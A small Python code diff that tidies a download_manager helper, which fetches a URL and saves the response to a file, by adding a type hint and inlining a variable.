@@ -192,14 +192,14 @@ def execute_download_manager(command: str, logger):
         return f'execute_download_manager error:{error}'
 
 
-def download_manager(down_link: str, file_name) -> bool:
+def download_manager(down_link: str, file_name: str) -> bool:
     '''Download Manager'''
     try:
-        url = down_link
-        req = get(url)
+        req = get(down_link)
 
         with open(file_name, "wb") as code:
             code.write(req.content)
         return True
+
     except:
         return False
